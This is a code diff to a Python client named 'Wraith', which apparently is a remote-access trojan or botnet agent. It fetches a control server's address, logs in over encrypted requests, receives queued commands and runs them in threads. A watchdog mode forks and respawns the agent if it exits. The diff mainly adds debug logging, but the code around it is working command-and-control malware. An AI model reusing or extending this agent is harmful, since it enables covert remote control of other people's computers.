@@ -47,7 +47,7 @@ TRUSTED_SERVER = "VWIVWNODCOWQPSPL"
 NON_DUPLICATE_CHECK_PORT = 47402
 # Whether to log the interactions with the server to the console.
 # Not recommended except for debugging
-INTERACTION_LOGGING = False
+DEBUG_MODE = False
 # Whether to act as a watchdog and spawn children as the wraiths
 START_AS_WATCHDOG = False
 # DO NOT EDIT
@@ -57,6 +57,7 @@ WRAITH_VERSION = "3.0.0"
 # END CONSTANTS
 
 if START_AS_WATCHDOG:
+    if DEBUG_MODE: print("Starting as Watchdog")
     # Define a function to check if the single instance socket is taken
     def is_wraith_running():
         with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
@@ -67,6 +68,7 @@ if START_AS_WATCHDOG:
         # Wait until the non-duplicate socket is free (this prevents the process
         # from spawning new wraiths if a wraith is already active)
         while is_wraith_running(): pass
+        if DEBUG_MODE: print("Starting a Child")
         # Spawn a child process. The parent will monitor the child
         # and re-start it if it exits
         pid = os.fork()
@@ -81,8 +83,12 @@ this_child_start_time = time.time()
 # Check if any other wraiths are active. If so, die. If not, bind
 # to socket to tell all other wraiths we're active.
 single_instance_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-try: single_instance_socket.bind(("localhost", NON_DUPLICATE_CHECK_PORT))
-except: sys.exit(0)
+try:
+    single_instance_socket.bind(("localhost", NON_DUPLICATE_CHECK_PORT))
+    if DEBUG_MODE: print("Single instance check passed, starting")
+except:
+    if DEBUG_MODE: print("Single instance check failed, exiting")
+    sys.exit(0)
 
 aes = aes()
 
@@ -97,7 +103,7 @@ class Wraith():
     # Make requests to the api and return responses
     def api(self, data_dict):
         # If we are meant to log interactions, log (debug)
-        if INTERACTION_LOGGING: print(f"\n[CLIENT]:\n{json.dumps(data_dict)}\n")
+        if DEBUG_MODE: print(f"\n[CLIENT]:\n{json.dumps(data_dict)}\n")
         # Create the encrypted data string
         data = self.crypt.encrypt(json.dumps(data_dict), self.CRYPT_KEY).decode()
         # Generate a prefix for ID and security purposes
@@ -119,7 +125,7 @@ class Wraith():
         try:
             response = json.loads(response)
             # If we are meant to log, log (debug)
-            if INTERACTION_LOGGING:
+            if DEBUG_MODE:
                 print(f"\n[SERVER]:\n{json.dumps(response)}\nISCRYPT: {response_is_crypt}\n")
             # If all worked out well, return the response as a dict.
             # If something failed, return False
@@ -250,7 +256,9 @@ class Wraith():
 while True:
     # Get the address of the wraith API
     try: connect_url = requests.get(FETCH_SERVER_LOCATION_URL).text; break
-    except: pass
+    except:
+        if DEBUG_MODE: print("Failed to get the address of the API")
+        time.sleep(5)
 
 wraith = Wraith(connect_url, CRYPT_KEY, aes)
 
@@ -265,15 +273,18 @@ while True:
         # Try login every 10 seconds until it works. Also, re-fetch the API url
         # in case the old one is no longer active and was updated
         while not wraith.login():
+            if DEBUG_MODE: print("Failed to log in, waiting 10 seconds before re-try")
             time.sleep(10)
             try: wraith.api_url = requests.get(FETCH_SERVER_LOCATION_URL).text
-            except: pass
+            except:
+                if DEBUG_MODE: print("Failed to get address of the API")
         # Continue to the next loop (re-send heartbeat)
         continue
 
     # If there are new commands to be executed, start a thread to process
     # them
     if len(wraith.command_queue) > 0:
+        if DEBUG_MODE: print(f"Received {len(wraith.command_queue)} commands")
         threading.Thread(target=wraith.run_commands, args=(wraith.command_queue.copy(),)).start()
         wraith.command_queue = []
 
